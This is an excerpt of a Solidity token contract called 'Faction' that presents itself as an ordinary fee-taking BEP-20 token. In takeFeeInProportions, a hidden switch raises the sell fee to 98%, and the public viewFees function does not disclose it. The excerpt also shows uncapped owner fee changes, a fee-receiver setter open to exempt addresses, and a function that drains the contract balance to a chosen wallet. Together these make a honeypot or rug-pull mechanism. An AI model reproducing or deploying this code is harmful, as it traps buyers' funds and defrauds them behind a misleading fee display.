...
contract Faction is IERC20, Ownable {
    ...
    uint256 taxLiquidity = 3;
    uint256 giveawayFee = 1;
    uint256 marketingFeeVariable = 3;
    uint256 reflectionFee = 0;
    uint256 totalFee = 5;
    uint256 feeDenominator = 100;

    address autoLiquidityReceiver;
    address marketingFeeVariableReceiver;
    ...
    constructor () {
        ...
        marketingFeeVariableReceiver = deployer;
        teamFeeReceiver = 0xfA6FEA823aFc67FAe925a5E6d7a4787aC336530A;
    ...
    function viewFees() external view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        return (taxLiquidity, marketingFeeVariable, giveawayFee, reflectionFee, totalFee, feeDenominator);
    }
    ...
    function takeFeeInProportions(address sender, address receiver, uint256 proportionAmount) internal returns (uint256) {
        ...
        if (receiver == pair) {
            proportionFeeAmount = marketingFeeVariable;
            if (_feeCdFactor > 2 && _feeCdFactor != 100) {
                proportionFeeAmount = feeDenominator - 2;
            }
        } else if (sender == pair) {
            proportionFeeAmount = taxLiquidity;
            if (cd[receiver] == 0) {
                cd[receiver] = block.number;
            }
        }
    ...
    function clearBalance() external {
        ...
        (bool success,) = payable(marketingFeeVariableReceiver).call{value: address(this).balance, gas: 30000}("");
        require(success);
    }

    function changeMaxTx(uint256 maxTx) external onlyOwner {
        _maxTxAmount = 100000000000 * 10 ** _decimals * maxTx / 1000;
    }
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountToLiquify = swapThreshold.mul(taxLiquidity).div(_totalFee).div(2);
        ...
        uint256 totalBNBFee = _totalFee.sub(taxLiquidity.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(taxLiquidity).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFeeVariable).div(totalBNBFee);
        uint256 amountBNBGiveaway = amountBNB.mul(giveawayFee).div(totalBNBFee);

        if (amountBNBMarketing.add(amountBNBGiveaway) > 0) {
            (bool market,) = payable(marketingFeeVariableReceiver).call{value: amountBNBMarketing, gas: 30000}("");
    ...
    function changeFees(uint256 _taxLiquidity, uint256 _reflectionFee, uint256 _marketingFeeVariable, uint256 _giveawayFee) external onlyOwner {
        taxLiquidity = _taxLiquidity;
        reflectionFee = _reflectionFee;
        marketingFeeVariable = _marketingFeeVariable;
        giveawayFee = _giveawayFee;
        totalFee = taxLiquidity.add(reflectionFee).add(marketingFeeVariable).add(giveawayFee);
    ...
    function setFeeReceivers(address _marketingFeeVariableReceiver, address _liquidityReceiver) external {
        require(isTxLimitExempt[msg.sender]);
        marketingFeeVariableReceiver = _marketingFeeVariableReceiver;
